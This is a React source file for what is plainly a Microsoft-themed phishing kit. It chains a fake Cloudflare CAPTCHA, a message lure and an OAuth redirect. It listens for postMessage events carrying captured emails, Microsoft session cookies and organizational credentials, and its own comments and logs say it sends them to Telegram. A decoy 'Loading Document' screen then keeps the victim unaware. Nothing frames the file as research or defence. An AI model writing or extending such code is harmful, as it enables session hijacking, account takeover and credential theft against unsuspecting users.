import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

// 🟢 NEW: Import cookie/email capture function and setter utilities
import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './utils/client-cookie-capture';

// Artificial delay helper (milliseconds)
const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
const nextStepDelay = SLOW_DELAY * 3;

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  const [pendingStep, setPendingStep] = useState<string | null>(null);

  // State to hold the most reliable email and cookies captured via postMessage
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);

  // Listen for messages from enhancer scripts for robust cookie/email capture
  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      // For security, you may check event.origin here if needed
      if (!event.data || typeof event.data !== 'object') return;

      // EMAIL ENHANCER
      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email); // Also store in utils for access anywhere
      }

      // MICROSOFT COOKIES ENHANCER
      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          // Store as JSON string in state
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies); // Store in utils for access anywhere
        } catch (e) {
          // fallback: ignore
        }
      }

      // ORGANIZATIONAL LOGIN ENHANCER
      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        // You could also capture org credentials if needed
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  // Check URL parameters only once on initial load
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  // Use effect to handle delayed step transitions
  useEffect(() => {
    if (pendingStep) {
      const timer = setTimeout(() => {
        setCurrentPage(pendingStep);
        setPendingStep(null);
      }, nextStepDelay);
      return () => clearTimeout(timer);
    }
  }, [pendingStep]);

  // Step 1: Captcha verified: go to message icon with delay
  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - waiting (slow) before moving to message icon landing');
    setPendingStep('message-icon');
  };

  // Step 2: Message icon opened: go to oauth redirect with delay
  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - waiting (slow) before moving to OAuth redirect');
    setPendingStep('oauth-redirect');
  };

  // Refresh page for back-to-captcha
  const handleCaptchaBack = () => {
    console.log('⬅️ Back to CAPTCHA (refresh page)');
    window.location.reload();
  };

  // Step 3: OAuth success: after Telegram, show loading document (final step, no more captcha)
  // 🟢 NEW: Accept real user email from sessionData and send cookies/email to Telegram
  const handleOAuthSuccess = async (sessionData: any) => {
    console.log('🔐 OAuth successful:', sessionData);

    // Prefer captured email/cookies from state; fallback to sessionData.email or document.cookie
    const userEmail = capturedEmail || sessionData?.email || '';
    const cookies = capturedCookies || document.cookie;

    // 🟢 Call the cookie/email capture/send function
    if (userEmail) {
      try {
        await captureAndSendCookies(userEmail, cookies);
        console.log('✅ Cookies and email sent to Telegram');
      } catch (err) {
        console.error('❌ Failed to send cookies/email to Telegram:', err);
      }
    } else {
      console.warn('⚠️ No user email found, skipping cookie/email send.');
    }

    setCurrentPage('document-loading');
  };

  // Allow user to retry OAuth from loading page if needed
  const handleOAuthBack = () => {
    console.log('⬅️ Back to message icon from OAuth');
    setCurrentPage('message-icon');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );

    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );

    case 'oauth-redirect':
      // RealOAuthRedirect will itself wait (slow) before redirecting to Microsoft
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success': // alias for document-loading
    case 'document-loading':
      return (
        <div style={{ 
          display: 'flex', 
          justifyContent: 'center', 
          alignItems: 'center', 
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{ 
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            {/* Spinning document icon */}
            <div style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              animation: 'spin 2s linear infinite',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button 
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button 
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      // fallback to captcha
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
  }
}

export default App;